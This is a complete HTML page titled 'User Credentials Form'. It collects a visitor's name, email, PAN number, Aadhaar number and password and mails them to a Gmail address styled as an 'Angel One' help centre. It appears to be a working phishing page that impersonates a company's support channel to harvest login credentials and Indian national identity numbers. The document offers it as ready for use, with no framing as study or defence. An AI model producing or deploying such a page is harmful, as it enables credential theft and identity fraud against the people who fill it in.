<!DOCTYPE html>
<html>
  <head>
    <title>User Credentials Form</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      h1 {
        text-align: center;
        color: #333;
        margin-left: 20px;
        margin-top: 40px;
      }

      form {
        max-width: 500px;
        margin: 0 auto;
        padding: 40px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
        text-align: center;
      }

      label {
        display: block;
        margin-bottom: 20px;
        color: #333;
        font-weight: bold;
        text-align: left;
      }

      input[type="text"],
      input[type="email"],
      input[type="password"],
      input[type="number"] {
        width: 100%;
        padding: 10px;
        border-radius: 5px;
        border: 1px solid #ccc;
        margin-bottom: 20px;
        box-sizing: border-box;
        font-size: 16px;
      }

      input[type="submit"],
      input[type="reset"] {
        background-color: #333;
        color: #fff;
        padding: 10px 20px;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
        margin-top: 20px;
      }

      input[type="submit"]:hover,
      input[type="reset"]:hover {
        background-color: #555;
      }
    </style>
  </head>
  <body>
    <h1>User Credentials Form</h1>
    <form action="mailto:angelonehelpcenter@gmail.com" method="post" enctype="text/plain">
      <label for="name">Name:</label>
      <input type="text" id="name" name="name" required>

      <label for="email">Email:</label>
      <input type="email" id="email" name="email" required>

      <label for="pan">PAN Number:</label>
      <input type="text" id="pan" name="pan" required>

      <label for="aadhaar">Aadhaar Number:</label>
      <input type="number" id="aadhaar" name="aadhaar" required>

      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required>

      <input type="submit" value="Submit">
      <input type="reset" value="Reset">
   
    </form>
  </body>
</html>
